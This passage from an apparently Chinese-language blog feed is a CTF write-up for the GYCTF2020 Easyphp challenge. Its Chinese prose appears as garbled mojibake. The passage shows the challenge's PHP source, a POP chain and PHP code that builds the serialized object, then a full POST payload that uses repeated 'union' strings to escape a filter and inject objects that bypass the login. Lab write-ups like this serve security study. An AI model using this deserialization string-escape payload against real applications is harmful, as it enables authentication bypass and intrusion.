punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$age</span><span class="token operator">=</span><span class="token variable">$Info</span><span class="token operator">-></span><span class="token property">age</span><span class="token punctuation">;</span>        <span class="token variable">$nickname</span><span class="token operator">=</span><span class="token variable">$Info</span><span class="token operator">-></span><span class="token property">nickname</span><span class="token punctuation">;</span>        <span class="token variable">$updateAction</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">UpdateHelper</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$Info</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"update user SET age=<span class="token interpolation"><span class="token variable">$age</span></span>,nickname=<span class="token interpolation"><span class="token variable">$nickname</span></span> where id="</span><span class="token operator">.</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//è¿™ä¸ªåŠŸèƒ½è¿˜æ²¡æœ‰å†™å®Œ å…ˆå å‘</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getNewInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$age</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'age'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$nickname</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'nickname'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token function">safe</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Info</span><span class="token punctuation">(</span><span class="token variable">$age</span><span class="token punctuation">,</span><span class="token variable">$nickname</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">nickname</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//å±</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">nickname</span><span class="token operator">-></span><span class="token function">update</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">age</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token string double-quoted-string">"0-0"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Info</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$age</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$nickname</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$CtrlCase</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$age</span><span class="token punctuation">,</span><span class="token variable">$nickname</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">age</span><span class="token operator">=</span><span class="token variable">$age</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">nickname</span><span class="token operator">=</span><span class="token variable">$nickname</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__call</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span><span class="token variable">$argument</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">CtrlCase</span><span class="token operator">-></span><span class="token function">login</span><span class="token punctuation">(</span><span class="token variable">$argument</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">Class</span> <span class="token class-name-definition class-name">UpdateHelper</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$id</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$newinfo</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$sql</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$newInfo</span><span class="token punctuation">,</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$newInfo</span><span class="token operator">=</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$newInfo</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$upDate</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">dbCtrl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">sql</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">dbCtrl</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$hostname</span><span class="token operator">=</span><span class="token string double-quoted-string">"127.0.0.1"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$dbuser</span><span class="token operator">=</span><span class="token string double-quoted-string">"root"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$dbpass</span><span class="token operator">=</span><span class="token string double-quoted-string">"root"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$database</span><span class="token operator">=</span><span class="token string double-quoted-string">"test"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$mysqli</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$token</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">token</span><span class="token operator">=</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'token'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">login</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">mysqli</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">mysqli</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">hostname</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">dbuser</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">dbpass</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">database</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">mysqli</span><span class="token operator">-></span><span class="token property">connect_error</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"è¿æ¥å¤±è´¥ï¼Œé”™è¯¯:"</span> <span class="token operator">.</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">mysqli</span><span class="token operator">-></span><span class="token property">connect_error</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$result</span><span class="token operator">=</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">mysqli</span><span class="token operator">-></span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$result</span><span class="token operator">-></span><span class="token function">bind_param</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'s'</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$result</span><span class="token operator">-></span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$result</span><span class="token operator">-></span><span class="token function">bind_result</span><span class="token punctuation">(</span><span class="token variable">$idResult</span><span class="token punctuation">,</span> <span class="token variable">$passwordResult</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$result</span><span class="token operator">-></span><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$result</span><span class="token operator">-></span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">token</span><span class="token operator">==</span><span class="token string single-quoted-string">'admin'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token variable">$idResult</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$idResult</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'ç”¨æˆ·ä¸å­˜åœ¨!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token variable">$passwordResult</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'å¯†ç é”™è¯¯ï¼'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'token'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$idResult</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">update</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token comment">//è¿˜æ²¡æ¥å¾—åŠå†™</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¦æƒ³è·å¾—flagï¼Œæœ‰ä¸¤ç§åŠæ³•ï¼š</p><p>1.token=admin</p><p>2.è¾“å…¥åŒ¹é…çš„ç”¨æˆ·åå¯†ç </p><p>POPé“¾å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-none"><code class="language-none">UpdateHelper::__destruct() -&gt; User::__toString() -&gt; Info::__call() -&gt; dbCtrl::login()<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">User</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$age</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$nickname</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">age</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'select 1,"c4ca4238a0b923820dcc509a6f75849b" from user where username=?'</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">nickname</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Info</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$CtrlCase</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">CtrlCase</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">dbCtrl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">UpdateHelper</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$sql</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">sql</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">dbCtrl</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"admin"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"1"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">UpdateHelper</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç”Ÿæˆ</p><pre class="line-numbers language-none"><code class="language-none">O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&#123;s:3:&quot;age&quot;;s:70:&quot;select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username&#x3D;?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:1:&#123;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:1:&quot;1&quot;;&#125;&#125;&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¿™ä¸ªååºåˆ—åŒ–åªèƒ½é€šè¿‡å®ä¾‹åŒ–ç±»çš„æ—¶å€™ä¼ å€¼ï¼Œ</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GYCTF2020-Easyphp/image-20210804234737377.png"></p><p>ä½†å®ƒçš„å®å‚æ˜¯ä¸å¯æ§çš„ï¼Œæ‰€ä»¥è¿™ä¸ªååºåˆ—åŒ–æ²¡æ³•ç”¨ã€‚</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GYCTF2020-Easyphp/image-20210804234931741.png"></p><p>è¿˜å¥½è¿™<code>User</code>è¿˜æœ‰ä¸ªååºåˆ—åŒ–ï¼Œè€Œä¸”æ˜¯å¯æ§çš„ã€‚</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GYCTF2020-Easyphp/image-20210804235144278.png"></p><p>æŒ‰ç¨‹åºçš„é€»è¾‘ï¼Œä¼ å…¥çš„åªæ˜¯å­—ç¬¦ä¸²ï¼Œæ²¡æ³•åˆ©ç”¨ï¼Œæ‰€ä»¥éœ€è¦è¿›è¡Œå­—ç¬¦ä¸²é€ƒé€¸ï¼ŒæŠŠå­—ç¬¦ä¸²â€å‡æ ¼â€œä¸ºå¯¹è±¡ã€‚</p><p>å¯ä»¥åˆ©ç”¨è¿™ä¸ªè¿›è¡Œå­—ç¬¦ä¸²é€ƒé€¸</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GYCTF2020-Easyphp/image-20210805232159045.png"></p><p>Infoç±»</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Info</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$age</span><span class="token operator">=</span><span class="token string single-quoted-string">'10'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$nickname</span><span class="token operator">=</span><span class="token string single-quoted-string">'123'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$CtrlCase</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$o</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$o</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç”Ÿæˆ</p><pre class="line-numbers language-none"><code class="language-none">O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;s:2:&quot;20&quot;;s:8:&quot;nickname&quot;;s:3:&quot;123&quot;;s:8:&quot;CtrlCase&quot;;N;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ„é€ ä¸ªpayloadï¼š</p><p>1.å‰æ–¹å¢åŠ <code>&quot;;s:8:&quot;CtrlCase&quot;;</code>ï¼Œç›¸å½“äº<code>CtrlCase</code>æ˜¯ä¸€ä¸ª<code>UpdateHelper</code>å¯¹è±¡ï¼Œç„¶ååœ¨è¿™ä¸ªå¯¹è±¡è¢«é”€æ¯çš„æ—¶å€™ï¼Œå°±ä¼šè§¦å‘popé“¾ï¼Œç”±äºé”€æ¯æ˜¯è‡ªåŠ¨çš„ï¼Œæ‰€ä»¥æ ¹æœ¬ä¸éœ€è¦è€ƒè™‘åœ¨å“ªè°ƒç”¨<code>CtrlCase</code>ï¼ï¼ï¼ï¼ï¼ï¼</p><p>2.æœ€ååŠ ä¸€ä¸ª<code>&#125;</code>ï¼Œç”¨äºé—­åˆ</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name-definition class-name">Info</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$age</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'10'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$nickname</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'";s:8:"CtrlCase";O:12:"UpdateHelper":1:&#123;s:3:"sql";O:4:"User":2:&#123;s:3:"age";s:70:"select 1,"c4ca4238a0b923820dcc509a6f75849b" from user where username=?";s:8:"nickname";O:4:"Info":1:&#123;s:8:"CtrlCase";O:6:"dbCtrl":2:&#123;s:4:"name";s:5:"admin";s:8:"password";s:1:"1";&#125;&#125;&#125;&#125;&#125;'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$CtrlCase</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$o</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$o</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç”Ÿæˆï¼š</p><pre class="line-numbers language-none"><code class="language-none">O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;s:2:&quot;10&quot;;s:8:&quot;nickname&quot;;s:263:&quot;&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&#123;s:3:&quot;age&quot;;s:70:&quot;select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username&#x3D;?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:1:&#123;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:1:&quot;1&quot;;&#125;&#125;&#125;&#125;&#125;&quot;;s:8:&quot;CtrlCase&quot;;N;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä¹‹ååˆ©ç”¨ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸ï¼Œunion-&gt;hackerï¼Œå¢åŠ ä¸€ä¸ªå­—ç¬¦ï¼Œæ„å‘³ç€å¯é€ƒä¸€ä¸ªå­—ç¬¦ã€‚</p><p>ä¸Šæ–¹çš„payloadé•¿åº¦æ˜¯263ï¼Œæ„å‘³ç€è¦é€ƒ263ä¸ªå­—ç¬¦ï¼Œé‚£å°±æ˜¯263ä¸ªunionã€‚</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GYCTF2020-Easyphp/20200329134813769.png" alt="20200329134813769"></p><p>æ”¾ä¸ªpayload</p><pre class="line-numbers language-none"><code class="language-none">age&#x3D;1&amp;nickname&#x3D;unionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunion&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&#123;s:3:&quot;age&quot;;s:70:&quot;select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username&#x3D;?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:1:&#123;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:1:&quot;1&quot;;&#125;&#125;&#125;&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="é—®é¢˜"><a href="#é—®é¢˜" class="headerlink" title="é—®é¢˜"></a>é—®é¢˜</h2><p>Qï¼šå·²ç»è®¾ç½®å¥½<code>$_SESSION[&#39;token&#39;]</code>ä¸ºadminäº†ï¼Œä¸ºä»€ä¹ˆç™»å½•çš„æ—¶å€™ç”¨æˆ·åå¿…é¡»ä¸ºadminï¼Ÿæµ‹è¯•äº†ä¸‹è¾“å…¥éšä¾¿è¾“å…¥å…¶ä»–è´¦å·å¯†ç ï¼Œä¸ä¼šæç¤ºç”¨æˆ·ä¸å­˜åœ¨/å¯†ç é”™è¯¯ï¼Œå°±å¾ˆå¥‡æ€ªã€‚</p><p>Aï¼šæƒ³äº†ä¸€ä¼šï¼Œæœ‰ç­”æ¡ˆäº†ï¼Œå› ä¸ºä¸çŸ¥é“å…¶ä»–æ­£å¸¸çš„ç”¨æˆ·åï¼Œ<code>select id,password from user where username=?</code>æ²¡æœ‰æ­£å¸¸è¿”å›å€¼ï¼Œä½†åˆå› ä¸ºtokenä¸ºadminï¼Œå¯¼è‡´ç›´æ¥returnï¼Œ</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GYCTF2020-Easyphp/image-20210807011234334.png"></p><p>ç„¶åidæ˜¯ç©ºçš„ï¼Œåœ¨è¿™å°±å•¥éƒ½æ²¡å‘ç”Ÿäº†ã€‚</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GYCTF2020-Easyphp/image-20210807011308616.png"></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> PHPä»£ç å®¡è®¡ </tag>
            
            <tag> ååºåˆ—åŒ– </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆ·é¢˜ç¬”è®°:[ç½‘é¼æ¯2018]Unfinish</title>
      <link href="/p/3379740036.html"/>
      <url>/p/3379740036.html</url>
      
